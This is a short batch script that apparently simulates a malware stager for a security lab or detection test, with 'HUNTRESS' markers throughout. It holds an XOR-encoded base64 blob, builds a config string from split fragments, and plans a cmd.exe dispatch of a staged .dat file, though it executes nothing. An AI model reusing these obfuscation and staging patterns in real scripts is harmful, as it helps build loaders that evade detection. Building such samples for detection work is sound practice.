@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse_xor
rem HUNTRESS-MATERIAL:R1JXHQULAwsEUgUGVQIeVlRSR0BvUVJ/QEBWQUddRntvUFpfUUZjb0BBVkBmbwlwDltHUkNsVl9aVU8FCwMLBFIFBlUCHl1UWlJDXlJQDldabF1UWlJDXlJQT1ZdXF0OVlRSRlRdUl9sR0tWXU9WX1RdWkAOW0NSQVRPAg5HXUZcUGxWVFJHQE9WS1YdV15QDkFWR0NSV1JPQEBWUFxBQ2xbUEdSQ0BaVx9fUlBcX2xWR1JQXF8OQENWR0BPAg5F
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set v_a0=v=1^|steps=locate_local,dispatch_process^|adapter=
set v_a1=cmd.exe^|stage_count=1^|graph=single^|next_language
set v_a2==none^|campaign_id=campaign-1f56a78086^|file_path=
set v_a3=C:\Users\Public\HuntressLab\stage-1f56a78086.dat
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_arithmetic=4fb78dd6"
set "HUNTRESS_READY=1"
if defined HUNTRESS_READY call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo cmd.exe dispatch C:\Users\Public\HuntressLab\stage-1f56a78086.dat
exit /b 0
